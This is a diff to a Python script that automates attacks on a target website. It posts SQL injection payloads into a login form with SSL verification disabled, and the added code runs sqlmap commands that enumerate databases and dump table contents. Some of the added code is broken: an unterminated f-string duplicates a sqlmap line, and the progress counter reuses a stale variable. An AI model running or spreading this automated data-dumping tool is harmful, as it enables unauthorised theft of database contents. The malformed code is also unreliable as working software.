@@ -1,6 +1,7 @@
 import subprocess
 import os
 import requests
+from requests.exceptions import RequestException, SSLError
 
 def run_command(command):
     """Run a command and return its output."""
@@ -83,12 +84,14 @@ def perform_sql_injection(target_url):
             'username': f'admin{payload}',
             'password': 'password'  # Update with the correct password field if needed
         }
-        
+
         try:
-            response = requests.post(target_url, data=data, verify=False)  # Disable SSL verification
+            response = requests.post(target_url, data=data, verify=False)  # Disabling SSL verification
             print(response.text)  # This will display the extracted data, handle it as you wish
-        except requests.RequestException as e:
-            print(f"Request failed: {e}")
+        except SSLError as e:
+            print(f"SSL Error: {e}")
+        except RequestException as e:
+            print(f"Request Error: {e}")
 
 def main():
     install_tools()
@@ -123,24 +126,41 @@ def main():
     total_tools = len(tools)
     
     for i, (tool_name, command) in enumerate(tools.items(), 1):
-        print(f"Running {tool_name} ({i}/{total_tools})...")
+        print(f"Esecuzione di {tool_name} ({i}/{total_tools})...")
         stdout, stderr = run_command(command)
-        save_to_file(output_file, f"=== {tool_name} Results ===\n")
+        save_to_file(output_file, f"=== Risultati {tool_name} ===\n")
         if stdout:
             save_to_file(output_file, stdout)
         if stderr:
-            save_to_file(output_file, f"Errors:\n{stderr}")
+            save_to_file(output_file, f"Errori:\n{stderr}")
         
         # Calculate and print the progress
         progress = (i / total_tools) * 100
-        print(f"Progress: {progress:.2f}%")
+        print(f"Progresso: {progress:.2f}%")
 
-    print("Analysis completed. Results saved in:", output_file)
+    # Execute additional SQLMap commands to retrieve database information
+    additional_sqlmap_commands = [
+        f"sqlmap -u {link_with_https}
+                f"sqlmap -u {link_with_https} --dbs",
+        f"sqlmap -u {link_with_https} --tables -D your_database_name",
+        f"sqlmap -u {link_with_https} --columns -D your_database_name -T your_table_name",
+        f"sqlmap -u {link_with_https} --dump -D your_database_name -T your_table_name"
+    ]
+    
+    for command in additional_sqlmap_commands:
+        print(f"Esecuzione di comando SQLMap: {command}")
+        stdout, stderr = run_command(command.split())
+        save_to_file(output_file, f"=== Risultati SQLMap ===\n")
+        if stdout:
+            save_to_file(output_file, stdout)
+        if stderr:
+            save_to_file(output_file, f"Errori:\n{stderr}")
+        
+        # Calculate and print the progress
+        progress = (i / total_tools) * 100
+        print(f"Progresso: {progress:.2f}%")
 
-    # Perform SQL injection
-        # Perform SQL injection tests
-    print(f"Performing SQL Injection test on {link_with_https}")
-    perform_sql_injection(link_with_https)
+    print("Analisi completata. I risultati sono stati salvati in:", output_file)
 
 if __name__ == "__main__":
     main()
